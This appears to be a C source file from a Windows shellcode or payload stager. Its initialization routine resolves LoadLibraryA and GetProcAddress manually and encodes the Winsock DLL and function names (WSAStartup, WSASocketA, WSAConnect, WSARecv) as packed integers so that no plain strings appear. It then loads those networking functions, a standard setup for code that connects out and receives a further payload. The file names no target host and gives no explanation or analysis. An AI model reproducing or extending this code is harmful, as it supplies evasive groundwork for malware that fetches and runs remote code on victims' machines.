#include "init.h"
#include <stdio.h>
#include <windef.h>

#define CI(c1,c2,c3,c4) ((c4)<<24 | (c3)<<16 | (c2)<<8 | (c1))

void Initialize(LPENV pEnv)
{
	HMODULE	hWs2_32;

	UINT sWs2_32_dll[] = { CI('W','s','2','_'), CI('3','2','.','d'), CI('l','l', 0 , 0 ) };
	UINT sWSAStartup[] = { CI('W','S','A','S'), CI('t','a','r','t'), CI('u','p', 0 , 0 ) };
	UINT sWSASocketA[] = { CI('W','S','A','S'), CI('o','c','k','e'), CI('t','A', 0 , 0 ) };
	UINT sWSAConnect[] = { CI('W','S','A','C'), CI('o','n','n','e'), CI('c','t', 0 , 0 ) };
	UINT sWSARecv[] = { CI('W','S','A','R'), CI('e','c','v', 0 ) };

	pEnv->pfnLoadLibraryA =		Find_LoadLibraryA();
	pEnv->pfnGetProcAddress =	Find_GetProcAddress();

	hWs2_32 = pEnv->pfnLoadLibraryA((LPCSTR)sWs2_32_dll);

	pEnv->pfnWSAStartup = (WSAStartupProc)pEnv->pfnGetProcAddress(hWs2_32, (LPCSTR)sWSAStartup);
	pEnv->pfnWSASocketA = (WSASocketAProc)pEnv->pfnGetProcAddress(hWs2_32, (LPCSTR)sWSASocketA);
	pEnv->pfnWSAConnect = (WSAConnectProc)pEnv->pfnGetProcAddress(hWs2_32, (LPCSTR)sWSAConnect);
	pEnv->pfnWSARecv =    (WSARecvProc)pEnv->pfnGetProcAddress(hWs2_32, (LPCSTR)sWSARecv);
}
